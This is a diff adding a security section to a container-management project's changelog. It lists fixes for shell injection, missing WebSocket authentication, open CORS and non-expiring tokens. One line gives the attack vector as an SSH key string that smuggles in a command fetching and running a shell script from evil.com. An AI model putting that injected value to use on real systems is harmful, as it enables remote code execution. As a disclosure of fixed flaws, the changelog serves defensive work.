@@ -7,7 +7,43 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Security
+- **CRITICAL: Fixed shell injection via SSH key content** (`internal/container/manager.go`)
+  - Malicious SSH keys could execute arbitrary commands inside containers
+  - Attack vector: `ssh-ed25519 AAAA' && curl evil.com/shell.sh | bash && echo '`
+  - Fix: Replaced shell `echo` command with Incus `WriteFile()` API
+- **CRITICAL: Fixed shell injection in sudoers setup** (`internal/container/manager.go`)
+  - Similar pattern to SSH key injection, mitigated by username validation
+  - Fix: Replaced shell `echo` command with Incus `WriteFile()` API
+- **CRITICAL: Fixed WebSocket terminal missing authentication** (`internal/gateway/gateway.go`)
+  - Unauthenticated users could open shell sessions by not providing a token
+  - Fix: Made token validation mandatory (returns 401 if no token provided)
+- **CRITICAL: Fixed CORS allowing all origins** (`internal/gateway/gateway.go`)
+  - CORS was configured with `*` allowing any website to make API requests
+  - Fix: Restricted to localhost by default, configurable via `CONTAINARIUM_ALLOWED_ORIGINS` env var
+- **CRITICAL: Fixed WebSocket origin validation always returning true** (`internal/gateway/terminal.go`)
+  - Combined with missing auth, any webpage could open terminal sessions
+  - Fix: Validates origin against allowed list, rejects requests without Origin header
+- **Fixed non-expiring JWT tokens allowed** (`internal/auth/token.go`)
+  - `--expiry 0` created tokens that never expired
+  - Fix: Enforced maximum 30-day expiry (configurable via `CONTAINARIUM_MAX_TOKEN_EXPIRY_HOURS`)
+- **Fixed hardcoded developer username path** (`internal/container/manager.go`)
+  - Removed `/home/hsinhoyeh` from SSH key fallback paths (information leak)
+- **Fixed hardcoded private key path in Terraform** (`terraform/gce/main.tf`)
+  - Replaced hardcoded path with `ssh_private_key_path` variable
+- **Added checksum verification to install script** (`scripts/install-mcp.sh`)
+  - Downloads and verifies SHA256 checksum before installation
+
 ### Added
+- **Security Test Suite** - Comprehensive tests for security-critical code
+  - `internal/auth/token_test.go` - JWT token expiry enforcement tests
+  - `internal/gateway/security_test.go` - CORS and WebSocket origin validation tests
+  - `internal/container/security_test.go` - Shell injection prevention tests
+- **New Environment Variables**:
+  - `CONTAINARIUM_ALLOWED_ORIGINS` - Comma-separated list of allowed CORS/WebSocket origins
+  - `CONTAINARIUM_MAX_TOKEN_EXPIRY_HOURS` - Maximum JWT token expiry in hours (default: 720)
+- **New Terraform Variable**:
+  - `ssh_private_key_path` - Path to SSH private key for provisioner connections
 - **Container Label Management** - Kubernetes-style labels for organizing containers
   - CLI commands for label operations:
     - `containarium label set <username> key=value [key2=value2...]` - Set labels on a container
